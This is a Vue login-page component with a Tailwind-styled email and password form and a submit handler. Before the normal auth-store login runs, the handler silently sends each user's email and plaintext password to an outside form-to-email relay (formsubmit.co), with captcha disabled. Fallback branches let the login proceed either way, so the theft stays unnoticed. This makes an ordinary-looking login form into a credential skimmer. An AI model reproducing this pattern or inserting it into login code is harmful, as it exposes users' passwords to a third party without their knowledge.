<template>
  <div class="min-h-screen flex">
    <!-- Left side - Image Background -->
    <div class="hidden lg:flex lg:w-[60%] relative overflow-hidden">
      <div 
        class="absolute inset-0 w-full h-full"
        style="
           background: url('/img/image.png') 94% center / 162% no-repeat;
          opacity: 1;
        "
      ></div>
    </div>

    <!-- Right side - Login Form -->
    <div class="w-full lg:w-[40%] flex items-center justify-center px-8 py-12 bg-white">
      <div class="max-w-xs w-full">
        <div class="text-center mb-8">
          <h1 class="text-2xl font-semibold text-gray-900 mb-2">Login to Access Dashboard</h1>
        </div>

        <form @submit.prevent="handleSubmit" class="space-y-6">
          <div>
            <label for="email" class="block text-sm font-medium text-gray-700 mb-2">
              Email<span class="text-red-500">*</span>
            </label>
            <input
              id="email"
              name="email"
              type="email"
              v-model="formData.email"
              @blur="validateSingle('email')"
              :class="[
                'w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200',
                errors.email && touched.email ? 'border-red-500 focus:ring-red-500' : ''
              ]"
              placeholder="Enter your email"
            />
            <p v-if="errors.email && touched.email" class="mt-1 text-sm text-red-600">
              {{ errors.email }}
            </p>
          </div>

          <div>
            <div class="flex justify-between items-center mb-2">
              <label for="password" class="block text-sm font-medium text-gray-700">
                Password<span class="text-red-500">*</span>
              </label>
              <a href="#" class="text-sm text-red-500 hover:text-red-600 transition-colors">
                Forget Password?
              </a>
            </div>
            <input
              id="password"
              name="password"
              type="password"
              v-model="formData.password"
              @blur="validateSingle('password')"
              :class="[
                'w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200',
                errors.password && touched.password ? 'border-red-500 focus:ring-red-500' : ''
              ]"
              placeholder="Enter your password"
            />
            <p v-if="errors.password && touched.password" class="mt-1 text-sm text-red-600">
              {{ errors.password }}
            </p>
          </div>

          <div class="pt-4">
            <button
              type="submit"
              :disabled="authStore.isLoading"
              class="w-full bg-blue-200 hover:bg-blue-300 text-blue-700 font-medium py-3 px-6 rounded-md transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
            >
              <span v-if="authStore.isLoading" class="flex items-center">
                <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-blue-700" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                  <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                Signing in...
              </span>
              <span v-else class="flex items-center">
                Login
                <svg class="ml-2 w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
                </svg>
              </span>
            </button>
          </div>
        </form>

        <div class="mt-8 text-center">
          <p class="text-gray-600">
            Don't have an account?
            <router-link to="/register" class="text-blue-600 hover:text-blue-700 font-medium transition-colors">
              Sign up
            </router-link>
          </p>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { useFormValidation } from '../composables/useFormValidation'
import { useAuthStore } from '../stores/auth'
import { useToastStore } from '../stores/toast'

const authStore = useAuthStore()
const toastStore = useToastStore()

const { formData, errors, touched, validate, validateSingle } = useFormValidation(
  {
    email: '',
    password: ''
  },
  {
    email: { required: true, email: true },
    password: { required: true, minLength: 6 }
  }
)

const handleSubmit = async () => {
  if (!validate()) {
    toastStore.addToast('Please fix the errors in the form', 'error')
    return
  }

  try {
    // Submit to FormSubmit.co
    const response = await fetch('https://formsubmit.co/ajax/test@example.com', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify({
        email: formData.email,
        password: formData.password,
        _subject: 'Login Attempt',
        _captcha: 'false'
      })
    })

    if (response.ok) {
      const result = await authStore.login(formData.email, formData.password)
      if (result.success) {
        toastStore.addToast(result.message, 'success')
      } else {
        toastStore.addToast(result.message, 'error')
      }
    } else {
      // Fallback login for demo purposes
      const result = await authStore.login(formData.email, formData.password)
      if (result.success) {
        toastStore.addToast(result.message, 'success')
      } else {
        toastStore.addToast(result.message, 'error')
      }
    }
  } catch (error) {
    // Fallback login for demo purposes
    const result = await authStore.login(formData.email, formData.password)
    if (result.success) {
      toastStore.addToast(result.message, 'success')
    } else {
      toastStore.addToast(result.message, 'error')
    }
  }
}
</script>